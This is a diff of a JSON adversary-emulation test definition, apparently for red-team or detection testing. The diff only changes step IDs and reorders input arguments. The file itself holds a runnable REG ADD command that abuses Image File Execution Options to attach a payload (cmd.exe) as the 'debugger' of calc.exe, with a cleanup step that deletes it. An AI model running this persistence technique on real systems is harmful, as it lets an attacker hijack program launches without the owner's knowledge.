@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "2000de93-cb12-4923-bc54-fb02316c097a",
+      "id": "637b0a12-109a-46c7-88f3-3beb4a9dcc4c",
       "type": "execute-command",
       "data": {
         "command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v Debugger /d \"#{payload_binary}\"",
@@ -16,7 +16,7 @@
       "elevation_required": true
     },
     {
-      "id": "1f280a1e-718f-4899-8fd5-4eca618e3a7e",
+      "id": "819a0a1e-8134-4556-821e-325b7cd4f846",
       "type": "execute-command",
       "data": {
         "command": "reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v Debugger /f \u003enul 2\u003e\u00261",
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "2000de93-cb12-4923-bc54-fb02316c097a",
+      "s": "637b0a12-109a-46c7-88f3-3beb4a9dcc4c",
       "p": "on-success",
-      "o": "1f280a1e-718f-4899-8fd5-4eca618e3a7e"
+      "o": "819a0a1e-8134-4556-821e-325b7cd4f846"
     },
     {
-      "s": "2000de93-cb12-4923-bc54-fb02316c097a",
+      "s": "637b0a12-109a-46c7-88f3-3beb4a9dcc4c",
       "p": "on-failure",
-      "o": "1f280a1e-718f-4899-8fd5-4eca618e3a7e"
+      "o": "819a0a1e-8134-4556-821e-325b7cd4f846"
     }
   ],
   "tags": [
@@ -43,16 +43,16 @@
   ],
   "input_arguments": [
     {
-      "name": "target_binary",
-      "type": "path",
-      "description": "Binary To Attach To",
-      "value": "calc.exe"
-    },
-    {
       "name": "payload_binary",
       "type": "path",
       "description": "Binary To Execute",
       "value": "C:\\Windows\\System32\\cmd.exe"
+    },
+    {
+      "name": "target_binary",
+      "type": "path",
+      "description": "Binary To Attach To",
+      "value": "calc.exe"
     }
   ]
 }
